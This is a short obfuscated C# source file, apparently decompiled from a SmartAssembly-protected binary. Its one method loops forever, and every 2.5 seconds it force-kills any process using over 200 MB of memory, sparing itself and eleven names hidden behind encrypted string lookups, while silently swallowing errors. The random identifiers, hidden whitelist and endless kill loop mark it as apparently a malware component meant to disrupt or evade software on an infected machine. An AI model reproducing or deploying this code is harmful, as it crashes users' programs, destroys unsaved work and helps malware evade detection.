using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

public static class VAuJfGZMbWiuS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void gsJPfUMuUGBKFGv()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107476527)) && !process.ProcessName.Contains(getString_0(107476550)) && !process.ProcessName.Contains(getString_0(107476541)) && !process.ProcessName.Contains(getString_0(107476500)) && !process.ProcessName.Contains(getString_0(107476519)) && !process.ProcessName.Contains(getString_0(107476506)) && !process.ProcessName.Contains(getString_0(107476461)) && !process.ProcessName.Contains(getString_0(107476480)) && !process.ProcessName.Contains(getString_0(107476435)) && !process.ProcessName.Contains(getString_0(107476454)) && !process.ProcessName.Contains(getString_0(107476401)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static VAuJfGZMbWiuS()
	{
		Strings.CreateGetStringDelegate(typeof(VAuJfGZMbWiuS));
	}
}
